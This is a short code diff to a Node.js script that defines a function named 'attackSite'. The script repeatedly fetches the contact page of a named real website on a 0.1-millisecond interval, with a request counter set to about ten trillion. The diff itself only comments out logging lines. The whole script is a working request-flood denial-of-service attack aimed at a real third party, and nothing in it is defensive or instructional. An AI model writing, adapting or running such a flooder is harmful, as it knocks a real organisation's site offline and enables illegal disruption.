@@ -10,14 +10,14 @@ let numberofRequest=10000000000000
 const fetch=require("isomorphic-fetch")
 var index=0
 const attackSite=async()=>{
-    console.log("fetch_time: ",index++ )
+    // console.log("fetch_time: ",index++ )
     try {
        
     const response=  await fetch("https://ipobontario.ca/contact-us/") 
      const result=await response.text()
-     console.log(result)
+    //  console.log(result)
     } catch (error) {
-     console.log(error.message)   
+    //  console.log(error.message)   
     }
 }
 
@@ -29,6 +29,7 @@ const attackSite=async()=>{
 
 setInterval(async()=>{
     attackSite()
+    // console.log("called")
 },0.1)
 
 
